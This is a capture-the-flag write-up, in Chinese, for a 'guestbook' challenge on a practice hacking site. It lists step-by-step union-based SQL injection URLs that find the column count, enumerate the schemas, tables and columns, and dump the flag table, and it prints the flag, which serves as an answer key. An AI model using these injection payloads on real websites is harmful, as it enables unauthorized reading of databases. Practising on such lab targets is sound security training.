guestbook
===

1. 透過 New Post 新增一筆資料
2. 在 Message List 下檢視剛新增的資料
3. 觀察 URL

```
https://hackme.inndy.tw/gb/?mod=read&id=124
```

1. 發現 `id` 可能為 SQLi 的注入點，嘗試確認欄位數。
```
https://hackme.inndy.tw/gb/
?mod=read
&id=124 order by 4%23-- -
```
2. 嘗試找出回顯位置。
```
https://hackme.inndy.tw/gb/
?mod=read
&id=-124 union select 1,2,3,4 %23-- -
```
3. 嘗試取得資料庫名稱
```
https://hackme.inndy.tw/gb/
?mod=read
&id=-124 union select 1,database(),group_concat(schema_name,'<br>'),4 from information_schema.schemata %23-- -
```
4. 取得資料表與欄位名稱
```
https://hackme.inndy.tw/gb/
?mod=read
&id=-124 union select 1,database(),group_concat(table_name, '::', column_name, '<br>'),4 from information_schema.columns where table_schema='g8'%23-- -
```
5. 取得 flag 欄位資料
```
https://hackme.inndy.tw/gb/
?mod=read
&id=-124 union select 1,database(),group_concat(flag, '::', padding0, '::', padding1 , '<br>'),4 from flag%23-- -
```
6. `FLAG{Y0U_KN0W_SQL_1NJECT10N!!!' or 595342>123123#}`